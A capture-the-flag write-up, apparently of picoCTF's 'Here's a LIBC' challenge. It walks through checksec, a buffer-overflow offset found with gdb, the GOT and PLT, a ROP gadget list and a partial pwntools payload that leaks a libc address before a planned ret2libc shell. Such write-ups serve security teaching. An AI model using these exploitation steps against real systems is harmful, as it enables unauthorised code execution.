# Here's a LIBC

ret2libc

## Finding libc version of vuln

Running `strings libc.so.6 | grep -i version` gives

```bash
> GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.
> ...
```

## Finding my libc version

Running `ldd vuln`, we get

```
linux-vdso.so.1 (0x00007ffda35f5000)
libc.so.6 => ./libc.so.6 (0x00007fb5d2200000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb5d2667000)
```

For a more specific version name, we can run `strings /lib64/ld-linux-x86-64.so.2 | grep -i version` and obtain

```
ld.so (Ubuntu GLIBC 2.35-0ubuntu3.4) stable release version 2.35
...
```

## pwninit

We run `pwninit` to patch the ELF with the correct libc

Using patchelf (which is runs as part of `pwninit`), we won't need to run the linker before the executable i.e. no need for `./ld-2.27.so ./vuln`. We can simply run `./vuln`. To run patchelf on vuln, run `patchelf --set-interpreter ./ld-2.27.so ./vuln`. 

## checksec

```bash
[*] "D:\\CTFs\\picoCTF\\Pwn\\Here's a LIBC\\vuln"
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./'
```

Partial RELRO means that the globel offset table is read- and writeable, see https://ctf101.org/binary-exploitation/relocation-read-only/ for more information

No stack canary, thus we do not need to worry about overwriting a set byte in our buffer overflow

NX enabled means that any segment of memory that is writable is not executable, so writing shell code and jumping to it via return address is not possible

No PIE so ASLR will not affect the text segment of the binary - every time the binary is run, the base address (of the binary) will be 0x4000000

## Buffer Overflow with gef gdb

Upon buffer overflowing .vuln in gef gdb with lots of 'A' characters, a segmentation fault will occur and the executable will stop running. gef shows us the following: 

```bash
Program received signal SIGSEGV, Segmentation fault.
0x0000000000400770 in do_stuff ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────$rax   : 0x7a
$rbx   : 0x0
$rcx   : 0x00007ffff7af4264  →  0x5477fffff0003d48 ("H="?)
$rdx   : 0x00007ffff7dd18c0  →  0x0000000000000000
$rsp   : 0x00007fffffffde48  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00007ffff7dd07e3  →  0xdd18c0000000000a ("\n"?)
$rdi   : 0x1
$rip   : 0x0000000000400770  →  <do_stuff+152> ret
$r8    : 0x79
$r9    : 0x0
$r10   : 0x0
$r11   : 0x246
$r12   : 0x1b
$r13   : 0x0
$r14   : 0x1b
$r15   : 0x0
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
───────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────0x00007fffffffde48│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"    ← $rsp
0x00007fffffffde50│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffde58│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffde60│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffde68│+0x0020: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffde70│+0x0028: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffde78│+0x0030: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffde80│+0x0038: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
─────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────     0x400769 <do_stuff+145>   call   0x400540 <puts@plt>
     0x40076e <do_stuff+150>   nop
     0x40076f <do_stuff+151>   leave
 →   0x400770 <do_stuff+152>   ret
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "vuln", stopped 0x400770 in do_stuff (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────[#0] 0x400770 → do_stuff()
```


$rip is not filled with "41"s because in 64-bit architecture, there is a check to see if the return memory address is valid. Since our buffer of 'A's is not valid, it is not stored in $rip (but you can see it in $rsp, about to be put into $rip). This can be verified with the command `x/gx $rsp` (more info at https://visualgdb.com/gdbreference/commands/x): 

```
gef➤  x/gx $rsp
0x7fffffffde48: 0x4141414141414141
```

## Generating and Using De Bruijn Sequence to find the Buffer Offset before Return Address

To create a De Bruijn Sequence (cyclic sequence in which every possible length-n string on A occurs exactly once as a substring, see https://en.wikipedia.org/wiki/De_Bruijn_sequence) of length 200, run `pattern create 200`: 

```
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
[+] Saved as '$_gef0'
```

To use the De Bruijn Sequence, we simply run the executable again, but this time pass the sequence in as input: 

```
gef➤  r
Starting program: /mnt/d/CTFs/picoCTF/Pwn/Here's a LIBC/vuln
WeLcOmE To mY EcHo sErVeR!
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
AaAaAaAaBaAaAaAaCaAaAaAaDaAaAaAaEaAaAaAaFaAaAaAaGaAaAaAaHaAaAaAaIaAaAaAaJaAaAaAaKaAaAaAaLaAaAaAaMaAaaaaanaaaaaaaoaaaaaaad

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400770 in do_stuff ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x7a
$rbx   : 0x0
$rcx   : 0x00007ffff7af4264  →  0x5477fffff0003d48 ("H="?)
$rdx   : 0x00007ffff7dd18c0  →  0x0000000000000000
$rsp   : 0x00007fffffffde48  →  "raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa[...]"
$rbp   : 0x6161616161616171 ("qaaaaaaa"?)
$rsi   : 0x00007ffff7dd07e3  →  0xdd18c0000000000a ("\n"?)
$rdi   : 0x1
$rip   : 0x0000000000400770  →  <do_stuff+152> ret
$r8    : 0x79
$r9    : 0x0
$r10   : 0x0
$r11   : 0x246
$r12   : 0x1b
$r13   : 0x0
$r14   : 0x1b
$r15   : 0x0
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffde48│+0x0000: "raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa[...]"    ← $rsp
0x00007fffffffde50│+0x0008: "saaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaaya[...]"
0x00007fffffffde58│+0x0010: "taaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"
0x00007fffffffde60│+0x0018: "uaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"
0x00007fffffffde68│+0x0020: "vaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"
0x00007fffffffde70│+0x0028: "waaaaaaaxaaaaaaayaaaaaaa"
0x00007fffffffde78│+0x0030: "xaaaaaaayaaaaaaa"
0x00007fffffffde80│+0x0038: "yaaaaaaa"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400769 <do_stuff+145>   call   0x400540 <puts@plt>
     0x40076e <do_stuff+150>   nop
     0x40076f <do_stuff+151>   leave
 →   0x400770 <do_stuff+152>   ret
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x400770 in do_stuff (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400770 → do_stuff()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Now, to find the offset of the De Bruijn Sequence that is stored in $rsp, we simply run `pattern offset $rsp`, and get: 

```
gef➤  pattern offset $rsp
[+] Searching for '7261616161616161'/'6161616161616172' with period=8
[+] Found at offset 136 (little-endian search) likely
```

Voila! The number of 'A's we need to pad before our payload is 136. 

# Using libc for exploitation

Since there is no ret2win or ability to return to shellcode that we control (remember from checksec that NX is enabled), we have to use gadgets from libc to get the flag. For context, libc is the C library within which many C functions (e.g. printf, scanf, etc) reside, but inside there also exists a function called system which can execute a shell command with "/bin/sh" (run `man 3 system` on WSL for more information). 

Whenever the executable runs, it loads libc into memory. Using gdb, setting a breakpoint at main and running, we can use the commands `p system`,  `p puts`, etc, to see the addresses of those shells: 

```
gef➤  break main
Breakpoint 1 at 0x400775
gef➤  r
Starting program: /mnt/d/CTFs/picoCTF/Pwn/Here's a LIBC/vuln

Breakpoint 1, 0x0000000000400775 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000000000400771  →  <main+0> push rbp
$rbx   : 0x0
$rcx   : 0x00000000004008b0  →  <__libc_csu_init+0> push r15
$rdx   : 0x00007fffffffdfe8  →  0x00007fffffffe276  →  "SHELL=/bin/bash"
$rsp   : 0x00007fffffffdef0  →  0x00000000004008b0  →  <__libc_csu_init+0> push r15
$rbp   : 0x00007fffffffdef0  →  0x00000000004008b0  →  <__libc_csu_init+0> push r15
$rsi   : 0x00007fffffffdfd8  →  0x00007fffffffe24b  →  "/mnt/d/CTFs/picoCTF/Pwn/Here's a LIBC/vuln"
$rdi   : 0x1
$rip   : 0x0000000000400775  →  <main+4> push r15
$r8    : 0x00007ffff7dd0d80  →  0x0000000000000000
$r9    : 0x00007ffff7dd0d80  →  0x0000000000000000
$r10   : 0x2
$r11   : 0xf
$r12   : 0x0000000000400590  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffdfd0  →  0x0000000000000001
$r14   : 0x0
$r15   : 0x0
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdef0│+0x0000: 0x00000000004008b0  →  <__libc_csu_init+0> push r15  ← $rsp, $rbp
0x00007fffffffdef8│+0x0008: 0x00007ffff7a05b97  →  <__libc_start_main+231> mov edi, eax
0x00007fffffffdf00│+0x0010: 0x0000000000000001
0x00007fffffffdf08│+0x0018: 0x00007fffffffdfd8  →  0x00007fffffffe24b  →  "/mnt/d/CTFs/picoCTF/Pwn/Here's a LIBC/vuln"
0x00007fffffffdf10│+0x0020: 0x000000010000c000
0x00007fffffffdf18│+0x0028: 0x0000000000400771  →  <main+0> push rbp
0x00007fffffffdf20│+0x0030: 0x0000000000000000
0x00007fffffffdf28│+0x0038: 0x974f8e5f9248bd4f
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400770 <do_stuff+152>   ret
     0x400771 <main+0>         push   rbp
     0x400772 <main+1>         mov    rbp, rsp
 →   0x400775 <main+4>         push   r15
     0x400777 <main+6>         push   r14
     0x400779 <main+8>         push   r13
     0x40077b <main+10>        push   r12
     0x40077d <main+12>        sub    rsp, 0x60
     0x400781 <main+16>        mov    DWORD PTR [rbp-0x74], edi
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x400775 in main (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400775 → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p system
$1 = {<text variable, no debug info>} 0x7ffff7a334e0 <system>
gef➤  p puts
$2 = {<text variable, no debug info>} 0x7ffff7a64a30 <puts>
```

In addition, if we run the command `vm`, the addresses of all data loaded into RAM will be shown: 

```
gef➤  vm
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /mnt/d/CTFs/picoCTF/Pwn/Here's a LIBC/vuln
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /mnt/d/CTFs/picoCTF/Pwn/Here's a LIBC/vuln
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /mnt/d/CTFs/picoCTF/Pwn/Here's a LIBC/vuln
0x00007ffff79e4000 0x00007ffff7bcb000 0x0000000000000000 r-x /mnt/d/CTFs/picoCTF/Pwn/Here's a LIBC/libc.so.6
0x00007ffff7bcb000 0x00007ffff7dcb000 0x00000000001e7000 --- /mnt/d/CTFs/picoCTF/Pwn/Here's a LIBC/libc.so.6
0x00007ffff7dcb000 0x00007ffff7dcf000 0x00000000001e7000 r-- /mnt/d/CTFs/picoCTF/Pwn/Here's a LIBC/libc.so.6
0x00007ffff7dcf000 0x00007ffff7dd1000 0x00000000001eb000 rw- /mnt/d/CTFs/picoCTF/Pwn/Here's a LIBC/libc.so.6
0x00007ffff7dd1000 0x00007ffff7dd5000 0x0000000000000000 rw-
0x00007ffff7dd5000 0x00007ffff7dfc000 0x0000000000000000 r-x /mnt/d/CTFs/picoCTF/Pwn/Here's a LIBC/ld-2.27.so
0x00007ffff7ff4000 0x00007ffff7ff6000 0x0000000000000000 rw-
0x00007ffff7ff6000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000027000 r-- /mnt/d/CTFs/picoCTF/Pwn/Here's a LIBC/ld-2.27.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000028000 rw- /mnt/d/CTFs/picoCTF/Pwn/Here's a LIBC/ld-2.27.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
```

Unfortunately, while there is no ASLR for the base address of the binary (0x400000), the addresses of the different data shown from running `vm` will be different everytime the executable is run. This means that the libc address will be different every time. However, the offset of specific functions within libc will not change as this would affect the program trying to refence an address to call some function in libc.  Thus, if we leak the address of any libc function, we can calculate the address of the system function by adding the corresponding offset. 

## Introducing the Global Offset Table (GOT) and Procedure Linkage Table (PLT)

When the program calls a libc function, it will jump to the relevant section in the PLT. More specifically, it calls a stub in PLT in which either of the following occurs
1. If this is the first time the binary calls this function, the dynamic linker to resolve the symbol, and load the appropriate libc address into the GOT. 
2. If this is not the first time the binary calls this function, then the GOT will already have the desired function address. Program execution will thus jump to the address written in the GOT. 

For illustration, this is how scanf() looks in the PLT (.plt in the program tree) in Ghidra: 

```
                             *************************************************************
                             *                        THUNK FUNCTION                       
                             *************************************************************
                             thunk  undefined  __isoc99_scanf ()
                               Thunked-Function:  <EXTERNAL>::__isoc99_s
             undefined         AL:1           <RETURN>
                             <EXTERNAL>::__isoc99_scanf                      XREF[2]:     do_stuff:004006fe (c) , 
                                                                                          do_stuff:00400719 (c)   
        00400580 ff  25  b2       JMP        qword ptr [DAT_00601038 ]                        undefined __isoc99_scanf()
                 0a  20  00                                                                   -> __isoc99_scanf
                             -- Flow Override: CALL_RETURN (COMPUTED_CALL_TERMINATOR)
        00400586 68  04  00       PUSH       0x4
                 00  00
        0040058b e9  a0  ff       JMP        FUN_00400530                                     undefined FUN_00400530()
                 ff  ff
                             -- Flow Override: CALL_RETURN (CALL_TERMINATOR)
```


From 00400580, the program will either (1) go to the next instruction 00400586, or (2) return the value of the address of scanf in libc i.e. the one we would obtain from `p scanf` in gef gdb. We then go to .got.plt in the program tree of Ghidra, and see that: 

```
                             DAT_00601038                                    XREF[1]:     __isoc99_scanf:00400580   
        00601038 30              ??         30h    0                                         ?  ->  00602030
        00601039 20              ??         20h     
        0060103a 60              ??         60h    `
        0060103b 00              ??         00h
        0060103c 00              ??         00h
        0060103d 00              ??         00h
        0060103e 00              ??         00h
        0060103f 00              ??         00h
```

The `0x0000000000302060` at address 00601038 is thus the address of scanf in libc (although as mentioned earlier, this will be different everytime the program executes due to ASLR). Thus, our goal is now to print the value at the address 00601038 at execution, which we can do with the puts function. We simply need to load, into the stack, 0x00601038 as the first argument, and then call puts (remember, we control the stack). We will use a rop gadget to achieve this. 

### Extra information
The PLT (.plt in Ghidra) is executed whenever libc functions are called, but it is the GOT that holds the actual libc function addresses (.got.plt in Ghidra). In this case, because NX is enabled, and PLT is executable, it cannot be written into (i.e. the randomized addressed cannot be written in). On the other hand, because of partial RELRO, the GOT is both readable and writable thus the libc addresses will be there. 

### Rop Gadgets
In simple terms, return-oriented programming (rop) gadgets are a set of instructions ending with a return instruction. Running `ROPgadget --binary vuln` gives us a whole list of usable gadgets: 

```bash
asdiml@DESKTOP-XXXXXX:~$ ROPgadget --binary vuln
Gadgets information
============================================================
0x00000000004005ee : adc byte ptr [rax], ah ; jmp rax
0x00000000004005b9 : add ah, dh ; nop dword ptr [rax + rax] ; ret
0x0000000000400587 : add al, 0 ; add byte ptr [rax], al ; jmp 0x400530
0x00000000004006d1 : add al, 0xf ; mov dh, 0x45 ; cld ; pop rbp ; ret
0x0000000000400567 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x400530
0x00000000004005bf : add bl, dh ; ret
0x000000000040091d : add byte ptr [rax], al ; add bl, dh ; ret
0x000000000040091b : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x0000000000400547 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x400530
0x0000000000400722 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40075b
0x0000000000400847 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x400880
0x000000000040066c : add byte ptr [rax], al ; add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x400600
0x000000000040091c : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x000000000040066d : add byte ptr [rax], al ; add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x400600
0x0000000000400549 : add byte ptr [rax], al ; jmp 0x400530
0x0000000000400724 : add byte ptr [rax], al ; jmp 0x40075b
0x0000000000400849 : add byte ptr [rax], al ; jmp 0x400880
0x00000000004005f6 : add byte ptr [rax], al ; pop rbp ; ret
0x000000000040066e : add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x400600
0x00000000004005be : add byte ptr [rax], al ; ret
0x00000000004005f5 : add byte ptr [rax], r8b ; pop rbp ; ret
0x00000000004005bd : add byte ptr [rax], r8b ; ret
0x000000000040066f : add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x400600
0x0000000000400657 : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000400557 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x400530
0x0000000000400658 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
0x00000000004006c7 : add eax, 0x20 ; jmp 0x4006d6
0x0000000000400577 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; jmp 0x400530
0x000000000040052b : add esp, 8 ; ret
0x000000000040052a : add rsp, 8 ; ret
0x00000000004006c9 : and bl, ch ; or cl, byte ptr [rdi] ; mov dh, 0x45 ; cld ; jmp 0x4006d6
0x00000000004005b8 : and byte ptr [rax], al ; hlt ; nop dword ptr [rax + rax] ; ret
0x0000000000400544 : and byte ptr [rax], al ; push 0 ; jmp 0x400530
0x0000000000400554 : and byte ptr [rax], al ; push 1 ; jmp 0x400530
0x0000000000400564 : and byte ptr [rax], al ; push 2 ; jmp 0x400530
0x0000000000400574 : and byte ptr [rax], al ; push 3 ; jmp 0x400530
0x0000000000400584 : and byte ptr [rax], al ; push 4 ; jmp 0x400530
0x0000000000400521 : and byte ptr [rax], al ; test rax, rax ; je 0x40052a ; call rax
0x000000000040076d : call qword ptr [rax + 0x4855c3c9]
0x0000000000400977 : call qword ptr [rax]
0x0000000000400528 : call rax
0x0000000000400721 : clc ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40075b
0x00000000004006c6 : cld ; add eax, 0x20 ; jmp 0x4006d6
0x000000000040069f : cld ; jmp 0x4006d6
0x00000000004006d5 : cld ; pop rbp ; ret
0x00000000004006a5 : cld ; sub eax, 0x20 ; jmp 0x4006d6
0x000000000040071d : dec dword ptr [rax - 0x39] ; clc ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40075b
0x00000000004008fc : fmul qword ptr [rax - 0x7d] ; ret
0x00000000004005ba : hlt ; nop dword ptr [rax + rax] ; ret
0x0000000000400673 : in eax, 0x5d ; jmp 0x400600
0x0000000000400526 : je 0x40052a ; call rax
0x00000000004005e9 : je 0x4005f8 ; pop rbp ; mov edi, 0x601050 ; jmp rax
0x000000000040062b : je 0x400638 ; pop rbp ; mov edi, 0x601050 ; jmp rax
0x000000000040069a : je 0x4006a2 ; movzx eax, byte ptr [rbp - 4] ; jmp 0x4006d6
0x00000000004006c1 : je 0x4006cc ; movzx eax, byte ptr [rbp - 4] ; add eax, 0x20 ; jmp 0x4006d6
0x000000000040054b : jmp 0x400530
0x0000000000400675 : jmp 0x400600
0x00000000004006a0 : jmp 0x4006d6
0x0000000000400726 : jmp 0x40075b
0x000000000040084b : jmp 0x400880
0x00000000004008a0 : jmp 0x400896
0x00000000004009f3 : jmp qword ptr [rax]
0x0000000000400a83 : jmp qword ptr [rbp]
0x0000000000400a1b : jmp qword ptr [rcx]
0x00000000004005f1 : jmp rax
0x000000000040076f : leave ; ret
0x0000000000400652 : mov byte ptr [rip + 0x2009ff], 1 ; pop rbp ; ret
0x00000000004006c4 : mov dh, 0x45 ; cld ; add eax, 0x20 ; jmp 0x4006d6
0x000000000040069d : mov dh, 0x45 ; cld ; jmp 0x4006d6
0x00000000004006d3 : mov dh, 0x45 ; cld ; pop rbp ; ret
0x00000000004006a3 : mov dh, 0x45 ; cld ; sub eax, 0x20 ; jmp 0x4006d6
0x0000000000400582 : mov dl, 0xa ; and byte ptr [rax], al ; push 4 ; jmp 0x400530
0x0000000000400844 : mov dword ptr [rbp - 0x28], 0 ; jmp 0x400880
0x000000000040071f : mov dword ptr [rbp - 8], 0 ; jmp 0x40075b
0x0000000000400842 : mov eax, 0xd845c748 ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x400880
0x0000000000400672 : mov ebp, esp ; pop rbp ; jmp 0x400600
0x00000000004005ec : mov edi, 0x601050 ; jmp rax
0x0000000000400572 : mov edx, 0x6800200a ; add eax, dword ptr [rax] ; add byte ptr [rax], al ; jmp 0x400530
0x0000000000400843 : mov qword ptr [rbp - 0x28], 0 ; jmp 0x400880
0x000000000040071e : mov qword ptr [rbp - 8], 0 ; jmp 0x40075b
0x0000000000400671 : mov rbp, rsp ; pop rbp ; jmp 0x400600
0x00000000004006c3 : movzx eax, byte ptr [rbp - 4] ; add eax, 0x20 ; jmp 0x4006d6
0x000000000040069c : movzx eax, byte ptr [rbp - 4] ; jmp 0x4006d6
0x00000000004006d2 : movzx eax, byte ptr [rbp - 4] ; pop rbp ; ret
0x00000000004006a2 : movzx eax, byte ptr [rbp - 4] ; sub eax, 0x20 ; jmp 0x4006d6
0x000000000040076e : nop ; leave ; ret
0x00000000004005f3 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x00000000004005bb : nop dword ptr [rax + rax] ; ret
0x0000000000400635 : nop dword ptr [rax] ; pop rbp ; ret
0x00000000004006cb : or cl, byte ptr [rdi] ; mov dh, 0x45 ; cld ; jmp 0x4006d6
0x0000000000400655 : or dword ptr [rax], esp ; add byte ptr [rcx], al ; pop rbp ; ret
0x00000000004006c2 : or dword ptr [rdi], ecx ; mov dh, 0x45 ; cld ; add eax, 0x20 ; jmp 0x4006d6
0x000000000040062c : or ebx, dword ptr [rbp - 0x41] ; push rax ; adc byte ptr [rax], ah ; jmp rax
0x000000000040090c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040090e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400910 : pop r14 ; pop r15 ; ret
0x0000000000400912 : pop r15 ; ret
0x0000000000400674 : pop rbp ; jmp 0x400600
0x00000000004005eb : pop rbp ; mov edi, 0x601050 ; jmp rax
0x000000000040090b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040090f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004005f8 : pop rbp ; ret
0x0000000000400913 : pop rdi ; ret
0x0000000000400911 : pop rsi ; pop r15 ; ret
0x000000000040090d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400546 : push 0 ; jmp 0x400530
0x0000000000400556 : push 1 ; jmp 0x400530
0x0000000000400566 : push 2 ; jmp 0x400530
0x0000000000400576 : push 3 ; jmp 0x400530
0x0000000000400586 : push 4 ; jmp 0x400530
0x00000000004005ed : push rax ; adc byte ptr [rax], ah ; jmp rax
0x0000000000400670 : push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x400600
0x000000000040052e : ret
0x0000000000400562 : ret 0x200a
0x00000000004007fd : ret 0x8348
0x0000000000400552 : retf 0x200a
0x0000000000400542 : ror byte ptr [rdx], cl ; and byte ptr [rax], al ; push 0 ; jmp 0x400530
0x00000000004005e8 : sal byte ptr [rbp + rcx + 0x5d], 0xbf ; push rax ; adc byte ptr [rax], ah ; jmp rax
0x000000000040062a : sal byte ptr [rbx + rcx + 0x5d], 0xbf ; push rax ; adc byte ptr [rax], ah ; jmp rax
0x0000000000400525 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x0000000000400699 : sal byte ptr [rsi + rax + 0xf], 0xb6 ; cld ; jmp 0x4006d6
0x00000000004006c8 : shl byte ptr [rax], 0xeb ; or cl, byte ptr [rdi] ; mov dh, 0x45 ; cld ; jmp 0x4006d6
0x00000000004006a6 : sub eax, 0x20 ; jmp 0x4006d6
0x0000000000400925 : sub esp, 8 ; add rsp, 8 ; ret
0x0000000000400924 : sub rsp, 8 ; add rsp, 8 ; ret
0x000000000040091a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000400524 : test eax, eax ; je 0x40052a ; call rax
0x0000000000400698 : test eax, eax ; je 0x4006a2 ; movzx eax, byte ptr [rbp - 4] ; jmp 0x4006d6
0x0000000000400523 : test rax, rax ; je 0x40052a ; call rax
0x0000000000400697 : test rax, rax ; je 0x4006a2 ; movzx eax, byte ptr [rbp - 4] ; jmp 0x4006d6
0x00000000004006a1 : xor al, 0xf ; mov dh, 0x45 ; cld ; sub eax, 0x20 ; jmp 0x4006d6

Unique gadgets found: 131
__________________________________________________________________________________________________________________
```

According to x86-64 calling conventions, the first argument of a function should be loaded into $rdi. Thus, we want to use a gadget that can load our desired value into rdi. From the gadget list above, we see that 

```
0x0000000000400913 : pop rdi ; ret
```

is simple and will work. Lastly, we need to be able to call puts. Referencing the PLT (.plt in Ghidra... remember, we only need to execute puts, not find its address in libc!), we see that the address to call is 0x400540. 

```
                             *************************************************************
                             *                        THUNK FUNCTION                       
                             *************************************************************
                             thunk  int  puts (char *  __s )
                               Thunked-Function:  <EXTERNAL>::puts
             int               EAX:4          <RETURN>
             char *            RDI:8          __s
                             <EXTERNAL>::puts                                XREF[2]:     do_stuff:00400769 (c) , 
                                                                                          main:00400891 (c)   
        00400540 ff  25  d2       JMP        qword ptr [-><EXTERNAL>::puts ]                  int puts(char * __s)
                 0a  20  00
                             -- Flow Override: CALL_RETURN (COMPUTED_CALL_TERMINATOR)
        00400546 68  00  00       PUSH       0x0
                 00  00
        0040054b e9  e0  ff       JMP        FUN_00400530                                     undefined FUN_00400530()
                 ff  ff
                             -- Flow Override: CALL_RETURN (CALL_TERMINATOR)
```

We now have three addresses of importance, with which in this order we can create our rop chain: 

```python
pop_rdi_gadget_addr = 0x400913
scanf_at_got = 0x601038
puts_at_plt = 0x400540
```

In order to ensure that program does not crash (and thus not output our desired address), however, we can jump to a safe place e.g. main. Thus, we add the address of main (which from Ghidra is 0x400771), and the payload is 

```python
payload = [
    pre_payload,
    p64(pop_rdi_gadget_addr),
    p64(scanf_at_got),
    p64(puts_at_plt),
    p64(back_to_main)
]
payload = b''.join(payload)
```

Running the py script that sends the payload, we get 

```
